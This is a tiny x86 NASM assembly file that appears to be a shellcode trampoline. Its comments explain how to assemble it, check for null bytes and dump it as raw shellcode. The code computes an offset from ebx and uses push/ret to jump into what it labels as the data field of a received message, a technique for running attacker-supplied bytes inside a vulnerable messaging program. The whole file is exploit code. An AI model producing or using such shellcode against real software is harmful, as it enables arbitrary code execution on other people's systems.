;  nasm -f elf -o out.o jmpcode.s
; first check for nulls:
;  objdump -d out.o
; or dump shellcode:
;  objcopy --output-target=binary --only-section=.text out.o jmpcode.bin

section .data
; crickets

section .text
global _start
_start:
; msg ebx
; msg.cmd ebx
; msg.from ebx+33
; msg.to
; msg.data ebx + 163

; jmp ebx+163+1 (msg data, after initial '!')
mov edx, ebx
add edx, 127
add edx, 37
push edx
ret